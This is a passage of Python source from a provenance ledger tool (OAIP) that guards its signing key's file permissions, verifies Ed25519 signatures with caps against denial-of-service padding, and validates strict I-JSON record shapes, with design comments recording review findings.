# nothing about a process running as the same uid, which is the case that matters
# most for an observed agent (see the deployment profiles in SPEC §8). What they
# do rule out is the accidental widening — an umask of 0002, a `cp -p` off a
# FAT/exFAT volume, a tarball unpacked as 0644, a shared group on a build host.
KEY_MODE_FORBIDDEN = 0o077      # a secret: NO group/other access of any kind
WRITE_MODE_FORBIDDEN = 0o022    # a decision input: no group/other WRITE


def _perm(path):
    """The permission bits of `path`, or None if they cannot be read / do not
    mean anything here (Windows reports a mode POSIX bits cannot be read from)."""
    if os.name != "posix":
        return None
    try:
        st = os.stat(path)
    except OSError:
        return None
    return st.st_mode & 0o777


def trust_perm_errors():
    """Custody refusals about the trust root, as a list of sentences.

    Returned rather than raised because the read paths (`verify`, `rebuild`) must
    REPORT this alongside their other findings, while the write paths (`init`,
    `accept`, `bind`) must refuse outright — see `require_trust_custody`."""
    errs = []
    m = _perm(WKEY)
    if m is not None and m & KEY_MODE_FORBIDDEN:
        errs.append(
            f"{WKEY}: the signing key is mode {m:04o} — accessible to group or "
            "other. Every acceptance this ledger files is that key, so an "
            "account that can read it can sign as this actor and OAIP will "
            f"derive the edge. Refusing to use it: `chmod 600 {WKEY}` (and "
            "rotate it if the host is shared — the exposure is not undone by "
            "narrowing the mode).")
    m = _perm(TRUST)
    if m is not None and m & WRITE_MODE_FORBIDDEN:
        errs.append(
            f"{TRUST}: the keyring is mode {m:04o} — writable by group or "
            "other. An acceptance edge is derived only from a signer this file "
            "vouches for, so whoever can write it can vouch for their own key. "
            f"`chmod 600 {TRUST}`.")
    m = _perm(TRUST_ROOT)
    if m is not None and m & WRITE_MODE_FORBIDDEN:
        errs.append(
            f"{TRUST_ROOT}: the directory holding the signing key and the "
            f"keyring is mode {m:04o} — writable by group or other, so both "
            "files can be REPLACED whatever their own modes say. "
            f"`chmod 700 {TRUST_ROOT}`.")
    return errs


def require_trust_custody():
    """The write paths' half of the same check: a refusal, in words.

    Called before anything SIGNS or VOUCHES. Signing with a key others can read,
    or binding into a keyring others can rewrite, records a custody that does not
    exist — and a false statement about custody is the one thing this project's
    decision layer cannot survive."""
    errs = trust_perm_errors()
    if errs:
        sys.exit("refusing to use this ledger's key material:\n  "
                 + "\n  ".join(errs))


def harden_trust_perms():
    """Make the trust root's own files what the check above demands.

    `warrant keygen` already chmods 0600, and this repeats it deliberately: OAIP
    must not depend on a delegate's umask discipline for the custody it then
    asserts. Failures are ignored on purpose — a filesystem with no POSIX modes
    (Windows, some network mounts) is a place where `trust_perm_errors` reports
    nothing either, and refusing to run there would be a claim about custody
    rather than a check of it.

    The DIRECTORY is deliberately not touched here: `ensure_trust_root_dir`
    creates it 0700 and nothing afterwards re-asserts that, so an operator who
    narrows it further keeps what they set."""
    for p, mode in ((WKEY, 0o600), (TRUST, 0o600)):
        try:
            if os.name == "posix" and os.path.exists(p):
                os.chmod(p, mode)
        except OSError:
            pass


def ensure_trust():
    """OAIP's keyring must exist before anything verifies: a missing trust config
    makes Warrant's settlement preflight fail closed, and an empty one is the
    honest starting point (no actor is bound until OAIP binds it)."""
    ensure_trust_root_dir()
    if not TRUST.is_file():
        write_keyring({})


def write_keyring(actors):
    """Write the keyring, or refuse in words. A READ-ONLY `.oaip` made `oaip
    bind` die with a PermissionError traceback instead of saying which file it
    could not write and why that matters (2026-07-30, third review round)."""
    try:
        TRUST.write_text(json.dumps({"actors": actors}, sort_keys=True) + "\n")
        harden_trust_perms()
    except OSError as e:
        sys.exit(f"cannot write the keyring {TRUST}: {e}. Nothing was bound — "
                 "OAIP derives an acceptance edge only from a signer this file "
                 "vouches for, so a keyring it cannot update is a refusal, not a "
                 "warning. Check the permissions on the ledger directory.")


def read_trust():
    """(actors, error). `actors` maps actor id → list of hex64 public keys.

    Deliberately in Warrant's trust-config shape (`{"actors": {...}}`, the closed
    schema its `--trust-config` validates) so the SAME file can be handed to
    Warrant's settlement grade; OAIP does not invent a second format.

    A keyring whose CUSTODY is broken is reported here as unreadable, not as
    empty: every caller treats an error as a refusal to derive edges, and
    treating "anyone on this host may rewrite this file" as an ordinary keyring
    would be the same mistake as reading a filename for an address."""
    custody = trust_perm_errors()
    if custody:
        return None, "; ".join(custody)
    if not TRUST.is_file():
        return {}, None
    try:
        doc = loads_ijson(TRUST.read_bytes())
    except (ValueError, OSError) as e:
        return None, f"{TRUST}: unreadable keyring: {e}"
    if not isinstance(doc, dict) or not isinstance(doc.get("actors", {}), dict):
        return None, f"{TRUST}: not a keyring ({{\"actors\": {{...}}}} expected)"
    actors = {}
    for a, keys in doc["actors"].items() if doc.get("actors") else []:
        if not (isinstance(keys, list) and all(isinstance(k, str) and HEX64.match(k)
                                               for k in keys)):
            return None, f"{TRUST}: actor {a!r} has a malformed key list"
        actors[a] = list(keys)
    return actors, None


def bind_actor(actor: str, key: str):
    """Record that `key` may sign as `actor`. Called only by `cmd_accept`, only
    for the key `.oaip/dev.key` — the key THIS ledger generated and custodies —
    so an attacker's key is never written here by any OAIP code path."""
    ensure_trust()
    actors, err = read_trust()
    if err:
        sys.exit(f"refusing to file an acceptance: {err}")
    if key in actors.get(actor, []):
        return
    actors.setdefault(actor, []).append(key)
    write_keyring(actors)


# HOW MUCH WORK ONE RECORD MAY COST OAIP (F1/F2, 2026-07-30, FOURTH round)
# ------------------------------------------------------------------------
# `sigs` lives OUTSIDE the hashed body — a record's address is
# `sha256(canon(body))` — so anyone who can write `.oaip/warrants/records/` can
# append UNLIMITED signature entries to an HONEST record without breaking its
# address, and the gate below used to verify every one of them. OAIP's Ed25519
# check is pure Python (measured here: ~1.6 ms for an entry crafted to reach the
# scalar multiplication, against ~0.06 ms for OpenSSL), so appended entries are a
# CPU amplifier that is paid again on EVERY rebuild and EVERY verify. Measured
# before these caps, 5,000 appended entries on one accept:
#     oaip rebuild  8.54 s   (0.35 s on the same store without them)
#     oaip verify   8.59 s   —  `warrant verify` over the same file: 0.28 s
# and 10,000 NOTE lines on stderr / 10,003 on stdout for that ONE record, with
# the `ERR`/`decision layer:` summary buried as the first and last line of the
# dump — the notes exist so a human can adjudicate co-signatures, so a flood
# defeats their purpose exactly as it defeats the CPU budget.
#
# The caps below are not a guess about attacker behaviour. They follow from what
# can DECIDE: only an entry naming this record's actor AND a key already bound to
# that actor, both string comparisons. An honest record costs one verification
# however much junk is appended to it.
SIG_DECIDE_CAP = 32     # entries that could decide, verified per record
SIG_NOTE_CAP = 8        # other entries described individually per record
# An honest accept record is well under a kilobyte. A record far outside that is
# padding, and parsing 100 MB of it is the same denial with the arithmetic moved
# one layer down.
MAX_STORE_RECORD_BYTES = 4 << 20


def accepting_signature(wid, env, actors):
    """Does a VALID, BOUND signature by the actor this record NAMES stand on it?

    Returns (refusal_or_None, notes, key, actor). `notes` are informational: they
    describe the OTHER signature entries, which are reported and never fatal.

    WHY "THE NAMED ACTOR'S", NOT "ALL OF THEM" (2026-07-30, third adversarial
    round, C2-F1b). This function used to demand that EVERY signature entry be
    bound, reasoning that a bound-but-invalid entry could stand next to an
    unbound-but-valid one. Now that OAIP verifies each signature itself that
    reasoning is gone, and what the rule actually did was hand a deletion primitive
    to anyone with store write access: Warrant SPEC §5 explicitly permits appending
    a co-signature, and deliberately will not let a junk one invalidate a good
    record (a griefing/availability vector). Measured before this change: ONE
    cryptographically VALID co-signature by `cosigner@other`, appended to an honest
    accept, left `warrant verify` at 0 errors and made `oaip rebuild` print
    `warrant=0` and exit 0 — the acceptance edge silently deleted by a
    Warrant-sanctioned operation, and a legitimate second endorser could not be
    expressed at all.

    So the question is the one OAIP actually needs answered: did the actor this
    record names sign it, with a key this ledger binds to that actor? Extra
    signatures endorse; they do not decide, and they cannot un-decide.

    AND IT ANSWERS IT IN BOUNDED WORK (F1, fourth round; see the caps above).
    This function used to verify EVERY entry before deciding anything, which made
    an append-only, address-preserving field into a ~50x CPU amplifier against
    every rebuild and every verify. It now runs the cheap tests first — does this
    entry name the record's actor, is its key already bound to that actor — and
    verifies only what could decide, stopping at the first entry that does."""
    body = env.get("body") if isinstance(env, dict) else None
    actor = body.get("actor") if isinstance(body, dict) else None
    claimed = actor.get("id") if isinstance(actor, dict) else None
    if not (isinstance(claimed, str) and claimed):
        return ("the record names no actor (body.actor.id), so no signature on "
                "it can be anyone's decision"), [], None, None
    sigs = env.get("sigs")
    if not isinstance(sigs, list) or not sigs:
        return "the record carries no signatures", [], None, claimed

    verdict = {}                    # so no entry is ever verified twice
    def verifies(s):
        if id(s) not in verdict:
            verdict[id(s)] = signature_verifies(wid, s)
        return verdict[id(s)]

    bound_keys = actors.get(claimed) or []
    claiming = [s for s in sigs if isinstance(s, dict)
                and s.get("actor") == claimed and isinstance(s.get("key"), str)]

    # PASS 1 — THE DECISION, and the only place cryptography is required. In file
    # order, so the honest signature (which Warrant writes first) decides on the
    # first verification no matter how much is appended after it.
    decided, over_cap, checked = None, False, 0
    for s in claiming:
        if s["key"] not in bound_keys:
            continue                # cannot decide: nothing vouches for this key
        if checked >= SIG_DECIDE_CAP:
            over_cap = True
            break
        checked += 1
        if verifies(s):
            decided = s
            break

    why, key = None, None
    if decided is not None:
        key = decided["key"]
    elif over_cap:
        # Reaching this needs MORE THAN SIG_DECIDE_CAP entries that each name this
        # actor AND a key this ledger binds to them, none of the first
        # SIG_DECIDE_CAP verifying — which no honest filer produces and no
        # APPENDER can produce either (an appended entry lands after the real
        # one). Refusing here is a decision with a reason, not a timeout.
        why = (f"more than {SIG_DECIDE_CAP} signature entries name actor "
               f"{claimed!r} with a key bound to it and none of the first "
               f"{SIG_DECIDE_CAP} verifies — refusing to keep verifying "
               "(signature entries are outside the hashed body, so their number "
               "is not evidence of anything)")
    elif not claiming:
        why = (f"no signature entry claims the actor this record names "
               f"({claimed!r})")
    else:
        # WHICH refusal it is needs the actor's other entries checked too — also
        # capped, and free for any entry pass 1 already looked at.
        valid = next((s for s in claiming[:SIG_DECIDE_CAP] if verifies(s)), None)
        if valid is not None:
            key = valid["key"]
            why = f"key {key[:12]} is not bound to actor {claimed!r} in {TRUST}"
        else:
            key = claiming[0]["key"]
            why = (f"the signature by {claimed!r} does NOT verify against key "
                   f"{key[:12]} (OAIP's own Ed25519 check)")
            # NAME THE CAUSE WHEN OAIP CAN. The refusal above is unchanged and
            # unconditional; this only appends WHICH failure it was, for the one
            # cause that is a migration rather than a forgery. A pre-0.6.0 store
            # is otherwise indistinguishable here from a corrupted one, and the
            # operator's next action is completely different.
            if any(legacy_signature(wid, s) for s in claiming[:SIG_DECIDE_CAP]):
                why += f" — {LEGACY_SIG_MESSAGE}"

    # PASS 2 — THE NOTES: everything else on the record, reported and never fatal
    # (§5 permits appended co-signatures). Past SIG_NOTE_CAP they are COUNTED
    # instead of described: 10,000 note lines for one record is not a report a
    # human can adjudicate, which is the only thing these notes are for (F2).
    notes, more, more_actors = [], 0, set()
    for s in sigs:
        if s is decided:
            continue                    # this one IS the decision, not a note
        if len(notes) >= SIG_NOTE_CAP:
            more += 1
            if isinstance(s, dict) and isinstance(s.get("actor"), str):
                more_actors.add(s["actor"])
            continue
        if not isinstance(s, dict):
            notes.append("a signature entry is not an object (ignored)")
            continue
        a, k = s.get("actor"), s.get("key")
        if not (isinstance(a, str) and isinstance(k, str)):
            notes.append("a signature entry has no actor/key strings (ignored)")
            continue
        if not verifies(s):
            notes.append(f"a signature by {a!r} does not verify and is EXCLUDED "
                         "(Warrant SPEC §5 permits appended co-signatures; a junk "
                         "one must not invalidate a good record)"
                         + (f" — {LEGACY_SIG_MESSAGE}"
                            if legacy_signature(wid, s) else ""))
        elif k not in (actors.get(a) or []):
            notes.append(f"a VALID co-signature by {a!r} (key {k[:12]}) is not "
                         f"bound in {TRUST} — recorded, but it endorses rather "
                         "than decides")
        else:
            notes.append(f"a VALID, bound co-signature by {a!r} (key {k[:12]})")
    if more:
        notes.append(f"{more} further signature entries excluded from this report "
                     f"({len(more_actors)} distinct actor id(s)) — co-signatures "
                     "endorse; they cannot decide or un-decide this record, and "
                     "nothing outside the hashed body is evidence")
    return why, notes, key, claimed


def store_report(settlement=True):
    """(report, error) — the Warrant CLI's `warrant.verify-report@v0` object.

    WHAT THIS IS, AND WHAT IT IS NOT. It is a SHAPE check on a JSON document, and
    a commit on this branch wrongly called it "the CLI identity probe" — a claim
    the third adversarial round refuted in four lines (see `ed25519_verify`): a
    stub that prints a well-formed clean report satisfies it completely. The
    honest description is narrower. `WARRANT_CLI=/usr/bin/true` exits 0 having
    verified nothing, and OAIP must not read an exit status as a verification, so
    a program that cannot even produce a parseable `warrant.verify-report@v0` is
    refused (F9). That rules out an *accident* — a mis-set variable, a wrapper
    that swallows output — not an adversary.

    What makes an adversary's stub useless is that OAIP no longer BELIEVES this
    report about signatures: `accepting_signature` verifies Ed25519 in
    process. This report can still make OAIP REFUSE (errors here are fatal to a
    rebuild), which is the safe direction for a delegated check."""
    if not warrant_cli_available():
        return None, ("no runnable Warrant CLI is configured (set WARRANT_CLI) "
                      "— refusing to reason about signatures nothing verified")
    ensure_trust()
    argv = ["--store", str(WSTORE), "verify", "--store-mode", "--json"]
    if settlement:
        argv += ["--settlement", "--trust-config", str(TRUST)]
    r = wrun(*argv)
    try:
        doc = json.loads(r.stdout)
    except ValueError:
        tail = (r.stdout + r.stderr).strip().splitlines()
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) did not "
                      f"emit a {VERIFY_REPORT} object (exit {r.returncode}) — an "
                      "exit status is not a verification"
                      + (f": {tail[-1][:120]}" if tail else ""))
    if not (isinstance(doc, dict) and doc.get("report") == VERIFY_REPORT
            and isinstance(doc.get("errors"), int)
            and isinstance(doc.get("warnings"), int)
            and isinstance(doc.get("findings"), list)):
        return None, (f"the configured Warrant CLI ({' '.join(WARRANT)}) emitted "
                      f"JSON that is not a {VERIFY_REPORT}")
    return doc, None


def findings_by_record(report):
    """subject → [messages], for the per-record half of a verify report."""
    out = {}
    for f in report.get("findings", []):
        if isinstance(f, dict) and isinstance(f.get("subject"), str):
            out.setdefault(f["subject"], []).append(str(f.get("message", "")))
    return out


# Findings that say Warrant excluded or could not read A signature on a record.
# They are NOT fatal here: Warrant reports them and carries on, correctly (§5
# lets anyone with store write access append a co-signature, so a junk one must
# not invalidate a good record), and OAIP now verifies each signature itself, so
# it can say WHICH entry was junk instead of losing track of all of them.
_AMBIGUOUS_SIG = ("does not verify", "is not an object", "no signatures",
                  "sigs must be a list")

# `WARN <wid12>  signature unbound: key <key12> claims actor <id>` — warrant.py's
# own text rendering (`print(f"{level:4} {wid[:12]}  {msg}")`).
_UNBOUND_LINE = re.compile(
    r"^WARN\s+(\S+)\s+(?:signature unbound|binding unverified \(no keyring\)): "
    r"key (\S+) claims actor (.*)$")


def unbound_by_warrant():
    """Warrant's OWN bound/unbound determination, as corroboration.

    `verify --settlement --trust-config` reports `signature unbound` / `binding
    unverified` in its human report against the same keyring file OAIP writes.
    It is read from the TEXT output because the machine-readable report drops the
    finding in quiet mode (`if quiet: pass` in warrant.py's emitting branch), so
    the JSON cannot carry it.

    Returns a set of (WarrantID prefix, key prefix, actor) triples — PER
    SIGNATURE, not per record. Per record was a second way an appended co-sig
    deleted an acceptance edge (C2-F1b): one unbound co-signature flagged the
    whole record, so the corroboration refused a record whose named actor had
    signed it perfectly well. An unreadable run returns None, which callers must
    treat as "no corroboration", never as "clean" — the enforced check is
    `accepting_signature`."""
    ensure_trust()
    r = wrun("--store", str(WSTORE), "verify", "--settlement",
             "--trust-config", str(TRUST))
    if r.returncode not in (0, 1):
        return None
    flagged = set()
    for line in (r.stdout + r.stderr).splitlines():
        m = _UNBOUND_LINE.match(line.strip())
        if m:
            flagged.add((m.group(1), m.group(2), m.group(3).strip()))
    return flagged


# ---------- strict I-JSON ingestion (SPEC §1) ----------
# §1 says every OAIP record is canonical I-JSON "exactly per Warrant SPEC §4".
# Serialising canonically is only half of that: the other half is REFUSING input
# outside the domain, and until 2026-07-30 nothing here refused anything —
# `json.loads` was called bare on every artifact read. Stock Python accepts
# duplicate member names (last-wins), NaN/Infinity, and lone surrogates; Warrant
# rejects all three, and Go's decoder disagrees with Python on the last two. So
# the same bytes would parse to different records in different implementations
# while the SPEC claimed one domain. These are reimplemented rather than imported
# from Warrant so OAIP stands alone as an implementation — and
# `tests/ijson_parity.py` pins them against Warrant's so the copy cannot drift.
def _reject_dup_keys(pairs):
    d = {}
    for k, v in pairs:
        if k in d:
            raise ValueError(f"duplicate member name: {k}")
        d[k] = v
    return d


def _reject_constant(sym):
    raise ValueError(f"invalid I-JSON constant: {sym}")


def _reject_lone_surrogates(obj):
    """RFC 7493: every string is valid Unicode. Python keeps a `\\ud800` escape as
    a surrogate code point; Go substitutes U+FFFD — the same bytes, two different
    strings, two different hashes."""
    if isinstance(obj, str):
        for ch in obj:
            if 0xD800 <= ord(ch) <= 0xDFFF:
                raise ValueError("lone surrogate in string (invalid I-JSON)")
    elif isinstance(obj, dict):
        for k, v in obj.items():
            _reject_lone_surrogates(k)
            _reject_lone_surrogates(v)
    elif isinstance(obj, list):
        for v in obj:
            _reject_lone_surrogates(v)
    return obj


def _reject_floats(obj, path="$"):
    """§1: "integers only (no floats anywhere)". Warrant enforces this per typed
    field in `validate_body`; OAIP had no schema layer at all, so it is enforced
    here at the domain boundary — a float `ts` or a fractional `confidence_ppm`
    is outside the format, not a value to round."""
    if isinstance(obj, float):
        raise ValueError(f"float at {path}: SPEC §1 permits integers only")
    if isinstance(obj, dict):
        for k, v in obj.items():
            _reject_floats(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            _reject_floats(v, f"{path}[{i}]")
    return obj


def loads_ijson(raw):
    """`json.loads` restricted to the domain SPEC §1 actually declares.

    The BOM case is a deliberate narrowing, not a grammar violation: RFC 8259 §8.1
    lets a receiver ignore a leading byte order mark, and "MAY" is unaffordable in
    a content-addressed format — the same record would arrive as two byte strings
    with two different addresses. Measured: Python's `json.loads` strips a BOM from
    BYTES and returns the record, Go's `encoding/json` rejects it. This mattered
    here and not in Warrant: `read_artifact` passes raw bytes, so the BOM was
    genuinely accepted, whereas every Warrant call site passes a `str`, where
    `json.loads` already fails. The reject vector recorded it as
    "ACCEPTED — must be refused" before this line existed.

    DEPTH IS PART OF THE DOMAIN (F3, 2026-07-30, fourth round). `json.loads` and
    both walkers above recurse, so ~1,000 levels of nesting anywhere in a ~2 KB
    document raised RecursionError — an exception no caller catches, since
    `read_artifact` and `read_warrant_store` catch OSError/ValueError. A 2 KB
    file therefore replaced every diagnosis with a traceback (the fourth instance
    of the class 1d5d0cb set out to close), and in `rebuild` it crashed BEFORE
    `mark_untrusted`, so `oaip log` went on printing "(signed decision)" from a
    stale projection with no marker — the sticky-projection pattern cb0712f
    claims to have closed. It is converted here, at the domain boundary, rather
    than at each of the six call sites: a depth this parser cannot walk is a
    document outside the domain, which is exactly what ValueError means here."""
    bom = b"\xef\xbb\xbf" if isinstance(raw, (bytes, bytearray)) else "﻿"
    if raw[:len(bom)] == bom:
        raise ValueError("leading byte order mark (not canonical I-JSON)")
    try:
        return _reject_floats(_reject_lone_surrogates(
            json.loads(raw, object_pairs_hook=_reject_dup_keys,
                       parse_constant=_reject_constant)))
    except RecursionError:
        raise ValueError(
            "nested deeper than this parser will walk (the limit is "
            f"{sys.getrecursionlimit()} levels) — a document that cannot be "
            "walked cannot be canonicalized, hashed or compared") from None


# ---------- record shapes (SPEC §1.1, §2, §6.2) ----------
# WHY A SCHEMA LAYER EXISTS AT ALL (2026-07-30, O3)
# ------------------------------------------------
# Until this section, "conformance" in this repository meant `examples/
# vectors.json`: byte-exact canonicalization over a handful of records, plus 25
# byte sequences the loader must refuse. That pins the SERIALIZER and says
# nothing about the RECORD — and the reference implementation was, in fact,
# writing a different record for every type in SPEC §2 (`oaip_record:
# "intent@v1"` with `description` where §2.3 declares `intent: "0.1"` with
# `actor`/`constraints`/`acceptance_refs`; no State records at all; nested
# effects; `check`/`check_exit`/`supported` where §2.7 declares `validation`).
# Both halves passed every vector, because no vector ever looked at a shape.
#
# So the shapes are now code, the code is pinned by `examples/record-vectors.
# json`, and every reader in this file runs them. The negative half is the half
# that matters: an implementation that accepts everything passes every positive
# vector, and the same is true one layer up — a validator that accepts every
# object validates nothing.
RECORD_TYPES = ("artifact", "attribution", "claim", "claim_subject", "effect",
                "environment_probe", "execution", "intent", "state",
                "toolchain_probe")
RECORD_VERSION = "0.1"                  # the only version this reader knows
LEGACY_TAG = "oaip_record"
# The pre-0.1 claim-SUBJECT blob had its own tag, and it carries a member named
# `execution` — a v0.1 type tag — so it needs the same first-position treatment
# the record tag gets. Its legacy identity is prefixed `subject:` because its
# tag value ("claim@v1") is the same string the legacy claim RECORD used.
LEGACY_SUBJECT_TAG = "oaip_subject"
_VERSION_RE = re.compile(r"^[0-9]+\.[0-9]+$")
_TAGNAME_RE = re.compile(r"^[a-z][a-z0-9_]*$")
_LEGACY_RE = re.compile(r"^[a-z_]+@v[0-9]+$")
HEX40 = re.compile(r"^[0-9a-f]{40}$")

# §7 registries, as data. An unregistered value in a CLOSED field makes the
# record invalid (§7): unknown-means-invalid is what stops a forward-dated value
# from meaning "valid" here and "invalid" in a second implementation.
EXECUTOR_RUNTIMES = {"exec@v1", "shell@v1"}
# §7.3. `oaip-host-shell@v1` is what this implementation ACTUALLY does; `cmd@v1`
# stays readable because every claim written before 2026-07-31 carries it and §6
# forbids making a record invalid that an earlier reading called valid — but this
# implementation never writes it again. It cannot: `cmd@v1` is Warrant's tag and
# Warrant SPEC §3 defines it as execution in an ISOLATED CONTAINER, which is not
# what `subprocess.run(check, shell=True)` on the observer's own host is. Found
# by external audit (Codex, 2026-07-31) with a working reproduction.
HOST_SHELL_RUNTIME = "oaip-host-shell@v1"
VALIDATION_RUNTIMES = {"cmd@v1", HOST_SHELL_RUNTIME}
VALIDATION_RESERVED = {"ski@v1"}
# Which validation runtimes may be filed into a Warrant record as a
# `because[].check` reason. Warrant SPEC §13.1 registers exactly `cmd@v1`
# (isolated container) and `ski@v1` (a Σ-GLYPH Book I oracle under an ATP
# budget); an unregistered value makes the Warrant record INVALID by MUST, and
# `warrant accept --runtime` will not even accept another string. OAIP can
# provide neither profile, so the set is EMPTY and the bridge files the
# validation as prose plus evidence instead (§3). It is a set rather than a
# `False` so that a future OAIP runtime which genuinely satisfies a Warrant tag
# has one place to be added — and so that this comment sits next to the reason
# it is empty.
WARRANT_CHECK_RUNTIMES = frozenset()
EFFECT_KINDS = {"file.create", "file.modify", "file.delete", "file.typechange"}
ENV_PROFILES = {"posix-base@v1"}
TOOLCHAIN_PROFILES = {"posix-base@v1"}
# §2.2.1: exactly these five names, always present, absence encoded as null.
ENV_PROFILE_VARS = ("LANG", "LC_ALL", "PATH", "SOURCE_DATE_EPOCH", "TZ")
# §2.2.2: exactly this probe, in this order.
TOOLCHAIN_PROFILE_TOOLS = ({"name": "git", "argv": ["git", "--version"]},)
# §7.6: the ceiling is BELOW certainty on purpose — an observer that started one
# process cannot exclude a writer it did not start.
ATTRIBUTION_METHODS = {"exclusive-command-window": 999999}
# §7.4's registered artifact kind for a record of each type. ONE table, used by
# the writer and by the rebuild: they had two, and the rebuild's copy silently
# relabelled every probe artifact ("record:environment_probe" against the
# writer's "environment-probe"), which is a real post-rebuild difference in a
# graph §5 says must be identical.
ARTIFACT_KIND = {"environment_probe": "environment-probe",
                 "toolchain_probe": "toolchain-probe",
                 "claim_subject": "claim-subject"}


def artifact_kind(record_type: str) -> str:
    return ARTIFACT_KIND.get(record_type, "record:" + record_type)


def classify_record(doc):
    """SPEC §1.1: what IS this document? -> (outcome, type, version, detail).

    outcome is one of: "record" (known type+version, shape not yet checked),
    "unsupported-version", "unknown-type", "legacy", "invalid", "not-a-record".
    The order of the tests is normative (§1.1) — without a fixed order two
    readers issue two different refusals for one document."""
    if not isinstance(doc, dict):
        return "not-a-record", None, None, None
    # THE LEGACY TAG IS TESTED FIRST, and that ordering is normative (§1.1).
    # A pre-0.1 execution record carries a member named `intent` and a pre-0.1
    # claim carries one named `execution` — both of which are v0.1 TYPE TAGS.
    # Testing the type tags first therefore classified every legacy execution as
    # "an execution record whose version is `1785439280731-5536ccfa`", and
    # rebuild called a perfectly intact pre-0.1 ledger three corrupt artifacts.
    # That collision is the same one that forced §2.4/§2.5 to rename those
    # members to `intent_id`/`execution_id`, arriving from the other direction.
    for member, prefix in ((LEGACY_TAG, ""), (LEGACY_SUBJECT_TAG, "subject:")):
        v = doc.get(member)
        if isinstance(v, str) and _LEGACY_RE.match(v):
            return "legacy", prefix + v, None, None
    tags = [k for k in doc if k in RECORD_TYPES]
    if len(tags) > 1:
        return ("invalid", None, None,
                "carries " + str(len(tags)) + " type tags (" +
                ", ".join(sorted(tags)) + "): a document that is two record "
                "types is neither")
    if tags:
        t = tags[0]
        v = doc[t]
        if not (isinstance(v, str) and _VERSION_RE.match(v)):
            return ("invalid", t, None,
                    f"the type tag {t!r} carries {v!r}, which is not a version "
                    "string — the type is known and its version is not, and "
                    "guessing one is what §1.1 forbids")
        if v != RECORD_VERSION:
            return ("unsupported-version", t, v,
                    f"{t} {v} is not a version this reader knows (it reads "
                    f"{RECORD_VERSION}); it is neither valid nor corrupt")
        return "record", t, v, None
    for k, v in doc.items():
        if (isinstance(k, str) and _TAGNAME_RE.match(k)
                and isinstance(v, str) and _VERSION_RE.match(v)):
            return ("unknown-type", k, v,
                    f"{k!r} is not a registered OAIP record type (§7.1)")
    return "not-a-record", None, None, None


def _hex64(v):
    return isinstance(v, str) and bool(HEX64.match(v))


def _hex40(v):
    return isinstance(v, str) and bool(HEX40.match(v))


def _int(v):
    return isinstance(v, int) and not isinstance(v, bool)


def _text(v):
    return isinstance(v, str) and v != ""


def _closed(doc, required, optional=()):
    """Members exactly `required`, plus at most `optional`. §1.1: an unknown
    member makes the record invalid, because a member one reader ignores and
    another reads is a member about which two readers derive different graphs
    from identical bytes."""
    have = set(doc)
    unknown = sorted(have - set(required) - set(optional))
    if unknown:
        return f"unknown member(s) {', '.join(repr(u) for u in unknown)}"
    missing = sorted(set(required) - have)
    if missing:
        return f"missing required member(s) {', '.join(repr(m) for m in missing)}"
    return None


def _hash_list(v, what, elem=_hex64, kind="hex64"):
    if not isinstance(v, list):
        return f"{what} must be an array"
    for h in v:
        if not elem(h):
            return f"{what} must contain only {kind} values (found {h!r})"
    if v != sorted(v):
        return f"{what} must be sorted ascending (array order is significant)"
    if len(set(v)) != len(v):
        return f"{what} must not repeat a value"
    return None


def _v_artifact(d):
    e = _closed(d, ("artifact", "hash", "kind", "size"))
    if e:
        return e
    if not _hex64(d["hash"]):
        return "hash must be hex64"
    if not _text(d["kind"]):
        return "kind must be a non-empty string"
    if not _int(d["size"]) or d["size"] < 0:
        return "size must be a non-negative integer"
    return None


def _v_state(d):
    e = _closed(d, ("state", "repo_commit", "worktree_tree", "env_fingerprint",
                    "toolchain_fingerprint"))
    if e:
        return e
    if not (d["repo_commit"] is None or _hex40(d["repo_commit"])):
        return "repo_commit must be hex40 or null (null = no commit yet)"
    if not _hex40(d["worktree_tree"]):
        return "worktree_tree must be a hex40 git tree id"
    for f in ("env_fingerprint", "toolchain_fingerprint"):
        if not _hex64(d[f]):
            return f"{f} must be hex64 (§2.2.1/§2.2.2)"
    return None


def _v_environment_probe(d):
    e = _closed(d, ("environment_probe", "profile", "os", "arch", "vars"))
    if e:
        return e
    if d["profile"] not in ENV_PROFILES:
        return (f"profile {d['profile']!r} is not registered (§7.5) — an "
                "unregistered profile is a fingerprint nobody else can reproduce")
    if not (_text(d["os"]) and _text(d["arch"])):
        return "os and arch must be non-empty strings (§2.2.3)"
    v = d["vars"]
    if not isinstance(v, dict):
        return "vars must be an object"
    extra = sorted(set(v) - set(ENV_PROFILE_VARS))
    missing = sorted(set(ENV_PROFILE_VARS) - set(v))
    if extra or missing:
        return ("vars must carry EXACTLY the profile's five names"
                + (f"; unexpected {extra}" if extra else "")
                + (f"; missing {missing} (absence is encoded as null, never by "
                   "omitting the member)" if missing else ""))
    for name in ENV_PROFILE_VARS:
        if not (v[name] is None or isinstance(v[name], str)):
            return f"vars.{name} must be a string or null"
    return None


def _v_toolchain_probe(d):
    e = _closed(d, ("toolchain_probe", "profile", "tools"))
    if e:
        return e
    if d["profile"] not in TOOLCHAIN_PROFILES:
        return f"profile {d['profile']!r} is not registered (§7.5)"
    tools = d["tools"]
    if not isinstance(tools, list) or len(tools) != len(TOOLCHAIN_PROFILE_TOOLS):
        return (f"tools must hold exactly {len(TOOLCHAIN_PROFILE_TOOLS)} probe(s), "
                "in the profile's order")
    for got, want in zip(tools, TOOLCHAIN_PROFILE_TOOLS):
        if not isinstance(got, dict):
            return "each tool must be an object"
        err = _closed(got, ("name", "argv", "status", "stdout_sha256"))
        if err:
            return f"tool: {err}"
        if got["name"] != want["name"] or got["argv"] != want["argv"]:
            return (f"tool {got.get('name')!r} does not match the profile's probe "
                    f"{want['name']!r} {want['argv']} — the probe set IS the "
                    "profile")
        if got["status"] not in ("ok", "absent", "error"):
            return "tool.status must be ok | absent | error"
        h = got["stdout_sha256"]
        if got["status"] == "absent":
            if h is not None:
                return "an absent tool produced no stdout: stdout_sha256 must be null"
        elif not _hex64(h):
            return "stdout_sha256 must be hex64 unless the tool was absent"
    return None


def _v_intent(d):
    e = _closed(d, ("intent", "id", "actor", "parent", "objective",
                    "constraints", "acceptance_refs", "ts"))
    if e:
        return e
    for f in ("id", "actor", "objective"):
        if not _text(d[f]):
            return f"{f} must be a non-empty string"
    if not (d["parent"] is None or _text(d["parent"])):
        return "parent must be an intent id or null"
    if not (isinstance(d["constraints"], list)
            and all(_text(c) for c in d["constraints"])):
        return "constraints must be an array of non-empty strings"
